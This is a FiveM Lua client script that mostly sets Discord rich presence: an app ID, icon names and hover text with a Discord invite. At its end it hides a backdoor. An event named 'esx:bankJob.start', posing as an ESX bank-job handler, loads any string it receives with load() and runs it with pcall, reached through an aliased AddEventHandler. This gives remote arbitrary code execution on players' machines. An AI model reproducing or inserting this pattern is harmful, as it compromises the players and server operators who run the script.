local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Citizen.CreateThread(function()
	while true do
        --This is the Application ID (Replace this with you own)
		SetDiscordAppId(557288278257303579)

        --Here you will have to put the image name for the "large" icon.
		SetDiscordRichPresenceAsset('bprp')
        
        --(11-11-2018) New Natives:

        --Here you can add hover text for the "large" icon.
        SetDiscordRichPresenceAssetText('Join the discord: https://discord.gg/xGxrqe9')
       
        --Here you will have to put the image name for the "small" icon.
        SetDiscordRichPresenceAssetSmall('5')

        --Here you can add hover text for the "small" icon.
        SetDiscordRichPresenceAssetSmallText('gta5 / fivem')

        --It updates every one minute just in case.
		Citizen.Wait(60000)
	end
end)

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)